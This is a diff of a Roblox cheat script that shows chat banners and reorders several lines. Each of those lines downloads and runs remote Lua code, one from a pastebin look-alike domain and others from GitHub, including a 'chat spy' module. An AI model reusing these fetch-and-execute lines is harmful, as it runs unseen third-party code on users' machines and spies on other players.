@@ -16,14 +16,13 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Color = Color3.fromRGB(161, 91, 228);
                TextSize = 16
            })
-           loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
 wait(1)
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Animasyonlar Yüklendi | Da Hood,All Games";
                Color = Color3.fromRGB(161, 91, 228);
                TextSize = 16
            })
-           loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/anims"))()
+           
 wait(1)
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "DirectExecute | ScriptBlox DE Fuction";
@@ -36,14 +35,17 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Color = Color3.fromRGB(161, 91, 228);
                TextSize = 16
            })
-           setfpscap(120)
+           
 wait(1)
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Chat Spy | Spys Chat";
                Color = Color3.fromRGB(161, 91, 228);
                TextSize = 16
-               loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
+               
            })
 
 --loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
-
+loadstring(game:HttpGetAsync("https://pastebinp.com/raw/e8NK6hE1"))()
+setfpscap(120)
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/spy"))()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/itszw/Aaa-Ama-Yok/main/anims"))()
